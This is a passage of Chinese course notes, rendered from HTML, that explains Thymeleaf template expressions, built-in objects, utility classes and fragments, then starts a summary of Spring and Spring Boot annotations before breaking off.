class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>内联javascript</p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">th:inline</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">         <span class="keyword">var</span> myname = [[$&#123;name&#125;]];</span></span><br><span class="line"><span class="language-javascript">         <span class="keyword">var</span> myage = [[$&#123;age&#125;]];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">         <span class="comment">//alert(&quot;获取的模板中数据 &quot;+ myname + &quot;,&quot;+myage)</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;单击事件，获取数据 &quot;</span>+ myname + <span class="string">&quot;,&quot;</span>+ [[$&#123;sex&#125;]])</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-7-字面量"><a href="#9-7-字面量" class="headerlink" title="9.7  字面量"></a>9.7  字面量</h2><p>例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 400px&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>文本字面量: 使用单引号括起来的字符串<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;&#x27;我是&#x27;+$&#123;name&#125;+&#x27;,我所在的城市&#x27;+$&#123;city&#125;&quot;</span>&gt;</span>数据显示<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>数字字面量<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;20&gt;5&#125;&quot;</span>&gt;</span> 20大于 5<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="tag">&lt;<span class="name">h3</span>&gt;</span>boolean字面量<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;isLogin == true&#125;&quot;</span>&gt;</span>用户已经登录系统<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="tag">&lt;<span class="name">h3</span>&gt;</span>null字面量<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;myuser != null&#125;&quot;</span>&gt;</span>有myuser数据<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-8-字符串连接"><a href="#9-8-字符串连接" class="headerlink" title="9.8  字符串连接"></a>9.8  字符串连接</h2><p>连接字符串有两种语法</p><p>1） 语法使用 单引号括起来字符串  ， 使用 + 连接其他的 字符串或者表达式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;&#x27;我是&#x27;+$&#123;name&#125;+&#x27;,我所在的城市&#x27;+$&#123;city&#125;&quot;</span>&gt;</span>数据显示<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2）语法：使用双竖线， |字符串和表达式|</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;|我是$&#123;name&#125;,我所在城市$&#123;city|&quot;</span>&gt;</span></span><br><span class="line">    显示数据</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 400px&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h3</span>&gt;</span>字符串连接方式1：使用单引号括起来的字符串<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;&#x27;我是&#x27;+$&#123;name&#125;+&#x27;,我所在的城市&#x27;+$&#123;city&#125;&quot;</span>&gt;</span>数据显示<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>字符串连接方式2：|字符串和表达式|<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;|我是$&#123;name&#125;,所在城市$&#123;city&#125;,其他人$&#123;myuser.name&#125;|&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-9-运算符"><a href="#9-9-运算符" class="headerlink" title="9.9 运算符"></a>9.9 运算符</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">算术运 算： + , - - , * , / , %</span><br><span class="line">关系比较 : &gt; , &lt; , &gt;= , &lt;= ( gt , lt , ge , le )</span><br><span class="line">相等判断： == , != ( eq , ne )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 400px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>使用运算符<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;age &gt; 10&#125;&quot;</span>&gt;</span>年龄大于 10 <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123; 20 + 30 &#125;&quot;</span>&gt;</span>显示运算结果<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;myuser == null&#125;&quot;</span>&gt;</span>myuser是null<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;myuser eq null&#125;&quot;</span>&gt;</span>myuser是null<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;myuser ne null&#125;&quot;</span>&gt;</span>myuser不是null<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;isLogin == true ? &#x27;用户已经登录&#x27; : &#x27;用户需要登录&#x27;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;isLogin == true ? ( age &gt; 10 ? &#x27;用户是大于10的&#x27; : &#x27;用户年龄比较小&#x27;) : &#x27;用户需要登录&#x27;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">三元运算符：</span><br><span class="line"> 表达式  ？ true的结果 : false的结果</span><br><span class="line"></span><br><span class="line">三元运算符可以嵌套</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="9-10-内置对象"><a href="#9-10-内置对象" class="headerlink" title="9.10 内置对象"></a>9.10 内置对象</h2><p>文档地址：<a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#web-context-namespaces-for-requestsession-attributes-etc">https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#web-context-namespaces-for-requestsession-attributes-etc</a>.</p><p>#request 表示 HttpServletRequest</p><p>#session 表示 HttpSession对象</p><p>session 表示Map对象的， 是#session的简单表示方式， 用来获取session中指定的key的值</p><p>​               #session.getAttribute(“loginname”) &#x3D;&#x3D; session.loginname</p><p>这些是内置对象，可以在模板文件中直接使用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 350px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>内置对象#request,#session，session的使用<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>获取作用域中的数据<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#request.getAttribute(&#x27;requestData&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#session.getAttribute(&#x27;sessionData&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;session.loginname&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>使用内置对象的方法<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        getRequestURL=<span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#request.getRequestURL()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        getRequestURI=<span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#request.getRequestURI()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        getQueryString=<span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#request.getQueryString()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        getContextPath=<span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#request.getContextPath()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        getServerName=<span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#request.getServerName()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        getServerPort=<span class="tag">&lt;<span class="name">span</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#request.getServerPort()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-11-内置工具类"><a href="#9-11-内置工具类" class="headerlink" title="9.11 内置工具类"></a>9.11 内置工具类</h2><p>内置工具类型： Thymeleaf自己的一些类，提供对string， date ，集合的一些处理方法</p><p>#dates: 处理日器的工具类</p><p>#numbers:处理数字的</p><p>#lists: 处理list集合的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 350px&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>日期类对象 #dates<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#dates.format(mydate )&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#dates.format(mydate,&#x27;yyyy-MM-dd&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#dates.format(mydate,&#x27;yyyy-MM-dd HH:mm:ss&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#dates.year(mydate)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#dates.month(mydate)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#dates.monthName(mydate)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#dates.createNow()&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>内置工具类#numbers，操作数字的<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#numbers.formatCurrency(mynum)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#numbers.formatDecimal(mynum,5,2)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>内置工具类#strings,操作字符串<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#strings.toUpperCase(mystr)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#strings.indexOf(mystr,&#x27;power&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#strings.substring(mystr,2,5)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#strings.substring(mystr,2)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#strings.concat(mystr,&#x27;---java开发的黄埔军校---&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#strings.length(mystr)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#strings.length(&#x27;hello&#x27;)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:unless</span>=<span class="string">&quot;$&#123;#strings.isEmpty(mystr)&#125;&quot;</span>&gt;</span> mystring 不是 空字符串  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>内置工具类#lists,操作list集合<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;#lists.size(mylist)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;#lists.contains(mylist,&#x27;a&#x27;)&#125;&quot;</span>&gt;</span>有成员a<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:if</span>=<span class="string">&quot;!$&#123;#lists.isEmpty(mylist)&#125;&quot;</span>&gt;</span> list 集合有多个成员<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>处理null<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;zoo?.dog?.name&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="9-12-自定义模板"><a href="#9-12-自定义模板" class="headerlink" title="9.12 自定义模板"></a>9.12 自定义模板</h2><p>模板是内容复用， 定义一次，在其他的模板文件中多次使用。</p><p>模板使用：</p><p>1.定义模板</p><p>2.使用模板</p><p>模板定义语法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">th:fragment=&quot;模板自定义名称&quot;</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:fragment</span>=<span class="string">&quot;head&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        动力节点-java开发</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        www.bjpowernode.com</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引用模板语法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1) ~&#123;templatename :: selector&#125;</span><br><span class="line">   templatename:  文件名称</span><br><span class="line">   selector： 自定义模板名称</span><br><span class="line">2）templatename :: selector</span><br><span class="line">   templatename:  文件名称</span><br><span class="line">   selector： 自定义模板名称</span><br><span class="line"></span><br><span class="line">对于使用模板：有包含模板（th:include）， 插入模板(th:insert)</span><br></pre></td></tr></table></figure><h1 id="第十章-总结"><a href="#第十章-总结" class="headerlink" title="第十章 总结"></a>第十章 总结</h1><h2 id="10-1-注解"><a href="#10-1-注解" class="headerlink" title="10.1 注解"></a>10.1 注解</h2><p>Spring + SpringMVC + SpringBoot </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">创建对象的：</span><br><span class="line"><span class="meta">@Controller</span>: 放在类的上面，创建控制器对象，注入到容器中</span><br><span class="line"><span class="meta">@RestController</span>: 放在类的上面，创建控制器对象，注入到容器中。</span><br><span class="line">             作用：复合注解是<span class="meta">@Controller</span> , <span class="meta">@ResponseBody</span>, 使用这个注解类的，里面的控制器方法的返回值                   都是数据</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span> ： 放在业务层的实现类上面，创建service对象，注入到容器</span><br><span class="line"><span class="meta">@Repository</span> : 放在dao层的实现类上面，创建dao对象，放入到容器。 没有使用这个注解，是因为现在使用MyBatis框               架，  dao对象是MyBatis通过代理生成的。 不需要使用<span class="meta">@Repository</span>、 所以没有使用。</span><br><span class="line"><span class="meta">@Component</span>:  放在类的上面，创建此类的对象，放入到容器中。 </span><br><span class="line"></span><br><span class="line">赋值的：</span><br><span class="line"><span class="meta">@Value</span> ： 简单类型的赋值， 例如 在属性的上面使用<span class="meta">@Value(&quot;李四&quot;)</span> <span class="keyword">private</span> String name</span><br><span class="line">          还可以使用<span class="meta">@Value</span>,获取配置文件者的数据（properties或yml）。 </span><br><span class="line">          <span class="meta">@Value(&quot;$&#123;server.port&#125;&quot;)</span> <span class="keyword">private</span> Integer port</span><br><span class="line"></span><br><span class="line"><span class="meta">@Autowired</span>: 引用类型赋值自动注入的，支持byName, byType. 默认是byType 。 放在属性的上面，也可以放在构造             方法的上面。 推荐是放在构造方法的上面</span><br><span class="line"><span class="meta">@Qualifer</span>:  给引用类型赋值，使用byName方式。   </span><br><span class="line">            <span class="meta">@Autowird</span>, <span class="meta">@Qualifer</span>都是Spring框架提供的。</span><br><span class="line"></span><br><span class="line"><span class="meta">@Resource</span> ： 来自jdk中的定义， javax.annotation。 实现引用类型的自动注入， 支持byName, byType.</span><br><span class="line">             默认是byName, 如果byName失败， 再使用byType注入。 在属性上面使用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">其他：</span><br><span class="line"><span class="meta">@Configuration</span> ： 放在类的上面，表示这是个配置类，相当于xml配置文件</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span>：放在方法的上面， 把方法的返回值对象，注入到spring容器中。</span><br><span class="line"></span><br><span class="line"><span class="meta">@ImportResource</span> ： 加载其他的xml配置文件， 把文件中的对象注入到spring容器中</span><br><span class="line"></span><br><span class="line"><span class="meta">@PropertySource</span> ： 读取其他的properties属性配置文件</span><br><span class="line"></span><br><span class="line"><span class="meta">@ComponentScan</span>： 扫描器 ，指定包名，扫描注解的</span><br><span class="line"></span><br><span class="line"><span class="meta">@ResponseBody</span>: 放在方法的上面，表示方法的返回值是数据， 不是视图</span><br><span class="line"><span class="meta">@RequestBody</span> : 把请求体中的数据，读取出来， 转为java对象使用。</span><br><span class="line"></span><br><span class="line"><span class="meta">@ControllerAdvice</span>:  控制器增强， 放在类的上面， 表示此类提供了方法，可以对controller增强功能。</span><br><span class="line"></span><br><span class="line"><span class="meta">@ExceptionHandler</span> : 处理异常的，放在方法的上面</span><br><span class="line"></span><br><span class="line"><span class="meta">@Transcational</span> :  处理事务的， 放在service实现类的<span class="keyword">public</span>方法上面， 表示此方法有事务</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SpringBoot中使用的注解</span><br><span class="line">    </span><br><span class="line"><span 